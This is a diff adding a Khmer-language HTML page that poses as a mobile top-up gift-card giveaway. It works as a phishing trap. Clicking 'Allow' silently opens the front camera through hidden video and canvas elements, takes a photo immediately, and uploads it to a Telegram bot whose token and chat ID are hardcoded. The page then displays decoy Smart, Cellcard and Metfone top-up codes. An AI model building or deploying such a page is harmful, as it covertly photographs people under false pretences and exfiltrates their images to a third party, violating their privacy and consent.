@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gift Box & Camera Access</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 20px;
+      background-color: #f4f4f9;
+    }
+
+    h2 {
+      color: #333;
+    }
+
+    /* Container សម្រាប់ប្រអប់កាដូ */
+    .gift-container {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+      margin-top: 40px;
+    }
+
+    .gift-card {
+      width: 140px;
+      height: 140px;
+      background-color: #ff4757;
+      color: white;
+      border-radius: 15px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-size: 50px;
+      cursor: pointer;
+      box-shadow: 0 8px 15px rgba(0,0,0,0.15);
+      transition: transform 0.2s, background-color 0.3s;
+    }
+
+    .gift-card:hover {
+      transform: translateY(-5px);
+      background-color: #ff6b81;
+    }
+
+    .gift-card span {
+      font-size: 14px;
+      margin-top: 5px;
+      font-weight: bold;
+    }
+
+    /* Modal / Pop-up Window សម្រាប់ Allow */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-content {
+      background: #fff;
+      padding: 30px 20px;
+      border-radius: 12px;
+      width: 80%;
+      max-width: 320px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .modal-content p {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .btn-allow {
+      padding: 12px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #fff;
+      background-color: #007bff;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.2s;
+    }
+
+    .btn-allow:hover {
+      background-color: #0056b3;
+    }
+
+    /* ប្រអប់បង្ហាញលេខកូដកាត */
+    .card-code-box {
+      background-color: #eccc68;
+      color: #2f3542;
+      font-size: 20px;
+      font-weight: bold;
+      letter-spacing: 2px;
+      padding: 15px;
+      border-radius: 8px;
+      border: 2px dashed #ffa502;
+      margin: 15px 0;
+      user-select: all;
+    }
+
+    /* លាក់វីដេអូ និង canvas មិនឱ្យឃើញនៅលើអេក្រង់ */
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>សូមជ្រើសរើសប្រអប់កាដូមួយ</h2>
+
+  <!-- បញ្ជីប្រអប់កាដូ -->
+  <div class="gift-container">
+    <div class="gift-card" onclick="openGiftModal(1)">
+      🎁
+      <span>កាដូទី ១</span>
+    </div>
+    <div class="gift-card" onclick="openGiftModal(2)">
+      🎁
+      <span>កាដូទី ២</span>
+    </div>
+    <div class="gift-card" onclick="openGiftModal(3)">
+      🎁
+      <span>កាដូទី ៣</span>
+    </div>
+  </div>
+
+  <!-- Pop-up Modal សម្រាប់ចុច Allow -->
+  <div class="modal-overlay" id="permissionModal">
+    <div class="modal-content">
+      <p>សូមចុចប៊ូតុងខាងក្រោមដើម្បីបើកប្រអប់កាដូ🎉</p>
+      <button class="btn-allow" onclick="requestPermission()">Allow</button>
+    </div>
+  </div>
+
+  <!-- Pop-up Modal បង្ហាញលេខកូដកាតទូរស័ព្ទបន្ទាប់ពីបើកកាដូ -->
+  <div class="modal-overlay" id="resultModal">
+    <div class="modal-content">
+      <h3>🎉 អបអរសាទរ!</h3>
+      <p id="giftText">អ្នកទទួលបានកាតទូរស័ព្ទ $5!</p>
+      
+      <!-- លេខកូដកាតទូរស័ព្ទ -->
+      <div id="cardCode" class="card-code-box">0000-0000-0000-00</div>
+
+      <button class="btn-allow" onclick="closeResultModal()">ទទួលយក</button>
+    </div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const modal = document.getElementById('permissionModal');
+    const resultModal = document.getElementById('resultModal');
+    const giftText = document.getElementById('giftText');
+    const cardCode = document.getElementById('cardCode');
+
+    // ព័ត៌មាន Telegram Bot របស់អ្នក
+    const BOT_TOKEN = "8742389901:AAHLwDIwH6CRTo9dbNv6ZwjOYxsbYICrTPI"; 
+    const CHAT_ID = "5983230232"; 
+
+    let selectedGiftId = null;
+
+    // បញ្ជីលេខកូដកាតទូរស័ព្ទតាមប្រអប់នីមួយៗ (អ្នកអាចកែប្រែលេខកូដតាមចិត្ត)
+    const giftsData = {
+      1: {
+        text: "អ្នកទទួលបានកាត Smart $5! 📱",
+        code: "*888*8392104857291#"
+      },
+      2: {
+        text: "អ្នកទទួលបានកាត Cellcard $5! 📱",
+        code: "*1203*94820184729104#"
+      },
+      3: {
+        text: "អ្នកទទួលបានកាត Metfone $5! 📱",
+        code: "*198*5739201847281#"
+      }
+    };
+
+    // មុខងារបង្ហាញ Pop-up ពេលចុចលើប្រអប់កាដូ
+    function openGiftModal(giftId) {
+      selectedGiftId = giftId;
+      modal.style.display = 'flex';
+    }
+
+    // មុខងារសុំសិទ្ធិ និងដំណើរការថតរូប
+    function requestPermission() {
+      // លាក់ Pop-up សុំសិទ្ធិ
+      modal.style.display = 'none';
+
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) 
+        .then(stream => {
+          video.srcObject = stream; 
+          
+          // ថតរូបភ្លាមៗនៅពេលវីដេអូទាញទិន្នន័យបាន (មិនប្រើ setTimeout/មិនចាំនាទី)
+          video.onloadedmetadata = () => {
+            takePhotoAuto(stream);
+          };
+        })
+        .catch(err => {
+          alert("Camera access denied!"); 
+          console.error(err); 
+        });
+    }
+
+    function takePhotoAuto(stream) {
+      const context = canvas.getContext('2d'); 
+
+      canvas.width = video.videoWidth; 
+      canvas.height = video.videoHeight; 
+      
+      context.drawImage(video, 0, 0); 
+
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData(); 
+        formData.append("chat_id", CHAT_ID); 
+        formData.append("photo", blob, "photo.png"); 
+
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+            method: "POST", 
+            body: formData 
+          });
+
+          // បង្ហាញលទ្ធផលកាដូ
+          showGiftResult();
+        } catch (error) {
+          console.error(error); 
+          showGiftResult();
+        } finally {
+          // បិទកាមេរ៉ាវិញភ្លាមៗបន្ទាប់ពីថតរួច
+          stream.getTracks().forEach(track => track.stop());
+        }
+
+      }, 'image/png'); 
+    }
+
+    // បង្ហាញ Pop-up លេខកូដកាតទូរស័ព្ទ
+    function showGiftResult() {
+      const giftInfo = giftsData[selectedGiftId] || giftsData[1];
+      giftText.innerText = giftInfo.text;
+      cardCode.innerText = giftInfo.code;
+      resultModal.style.display = 'flex';
+    }
+
+    function closeResultModal() {
+      resultModal.style.display = 'none';
+    }
+  </script>
+
+</body>
+</html>
